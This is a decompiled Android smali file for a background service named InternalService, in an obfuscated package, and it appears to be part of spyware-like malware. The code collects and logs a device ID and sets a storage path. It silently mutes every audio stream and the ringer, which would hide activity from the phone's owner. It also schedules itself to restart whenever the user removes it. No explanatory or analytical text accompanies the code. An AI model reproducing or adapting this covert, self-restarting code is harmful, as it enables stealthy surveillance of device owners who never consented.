.class public final Lgqegwqg/bbebebefff/asdcdsac/InternalService;
.super Landroid/app/Service;
.source "sourcefile"

# interfaces
.implements Landroid/speech/tts/TextToSpeech$OnInitListener;


# instance fields
.field public e:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 104
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 106
    nop

    .line 108
    invoke-static {}, Li/a/a/q;->c()Ljava/lang/String;

    .line 104
    return-void
.end method


# virtual methods
.method public final a()V
    .locals 4
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "CheckResult"
        }
    .end annotation

    .line 208
    new-instance v0, Lg/j/a/a/a$a;

    invoke-direct {v0}, Lg/j/a/a/a$a;-><init>()V

    .line 209
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lg/j/a/a/a$a;->b(Landroid/content/Context;)Lg/j/a/a/a$a;

    .line 210
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lg/j/a/a/a$a;->c(I)Lg/j/a/a/a$a;

    .line 211
    invoke-virtual {p0}, Landroid/app/Service;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lg/j/a/a/a$a;->d(Ljava/lang/String;)Lg/j/a/a/a$a;

    .line 212
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lg/j/a/a/a$a;->e(Z)Lg/j/a/a/a$a;

    .line 213
    invoke-virtual {v0}, Lg/j/a/a/a$a;->a()V

    .line 214
    invoke-static {}, Li/a/a/s;->o()V

    .line 215
    sget-object v0, Li/a/a/q;->c:Lorg/json/JSONObject;

    const-string v1, "device_id"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 216
    .local v0, "deviceID":Ljava/lang/String;
    const-string v1, "deviceID"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 217
    sput-object v0, Li/a/a/q;->a:Ljava/lang/String;

    .line 218
    nop

    .line 219
    invoke-static {}, Ln/a/a/g/b;->a()Ln/a/a/g/b;

    move-result-object v1

    const-string v2, "currentpath"

    const-string v3, "/storage/emulated/0"

    invoke-virtual {v1, v2, v3}, Ln/a/a/g/b;->g(Ljava/lang/String;Ljava/lang/String;)V

    .line 220
    nop

    .line 223
    :try_start_0
    sget-object v1, Li/a/a/q;->a:Ljava/lang/String;

    invoke-static {v1}, Li/a/a/s;->b(Ljava/lang/String;)Li/a/a/s;

    .line 225
    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/InternalService;->b()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 226
    :catch_0
    move-exception v1

    .line 227
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "efef"

    invoke-static {v3, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 233
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public final b()V
    .locals 4

    .line 826
    const-string v0, "audio"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "null cannot be cast to non-null type android.media.AudioManager"

    invoke-static {v0, v1}, Ll/v/d/i;->d(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v0, Landroid/media/AudioManager;

    .line 827
    .local v0, "am":Landroid/media/AudioManager;
    const/4 v1, 0x3

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 828
    const/4 v1, 0x2

    invoke-virtual {v0, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 829
    const/4 v1, 0x5

    invoke-virtual {v0, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 830
    const/4 v1, 0x1

    invoke-virtual {v0, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 831
    invoke-virtual {v0, v2}, Landroid/media/AudioManager;->setMode(I)V

    .line 832
    invoke-virtual {v0, v2}, Landroid/media/AudioManager;->setRingerMode(I)V

    .line 833
    const/16 v3, 0x8

    invoke-virtual {v0, v3, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    .line 834
    invoke-virtual {v0, v1, v1}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    .line 835
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    const-string v0, "intent"

    invoke-static {p1, v0}, Ll/v/d/i;->f(Ljava/lang/Object;Ljava/lang/String;)V

    .line 480
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 2

    .line 114
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 115
    const-string v0, "myLog"

    const-string v1, "Service: onCreate"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 116
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/InternalService;->e:Landroid/content/Context;

    .line 117
    new-instance v0, Li/a/a/q;

    invoke-direct {v0}, Li/a/a/q;-><init>()V

    .line 118
    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/InternalService;->e:Landroid/content/Context;

    invoke-static {v0}, Lg/b/a;->a(Landroid/content/Context;)V

    .line 123
    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/InternalService;->a()V

    .line 124
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 484
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 485
    return-void
.end method

.method public onInit(I)V
    .locals 0
    .param p1, "status"    # I

    .line 877
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .line 190
    const-string v0, "myLog"

    const-string v1, "Service: onStartCommand"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 191
    const/4 v0, 0x1

    return v0
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 7
    .param p1, "rootIntent"    # Landroid/content/Intent;

    const-string v0, "rootIntent"

    invoke-static {p1, v0}, Ll/v/d/i;->f(Ljava/lang/Object;Ljava/lang/String;)V

    .line 195
    const-string v0, "myLog"

    const-string v1, "Service: onTaskRemoved"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 196
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 197
    .local v0, "restartService":Landroid/content/Intent;
    invoke-virtual {p0}, Landroid/app/Service;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 199
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    .line 200
    nop

    .line 198
    const/4 v2, 0x1

    const/high16 v3, 0x40000000    # 2.0f

    invoke-static {v1, v2, v0, v3}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    .line 201
    .local v1, "restartServicePI":Landroid/app/PendingIntent;
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "alarm"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    const-string v3, "null cannot be cast to non-null type android.app.AlarmManager"

    invoke-static {v2, v3}, Ll/v/d/i;->d(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v2, Landroid/app/AlarmManager;

    .line 202
    .local v2, "alarmService":Landroid/app/AlarmManager;
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v3

    const/16 v5, 0x3e8

    int-to-long v5, v5

    add-long/2addr v3, v5

    const/4 v5, 0x3

    invoke-virtual {v2, v5, v3, v4, v1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 203
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 204
    return-void
.end method
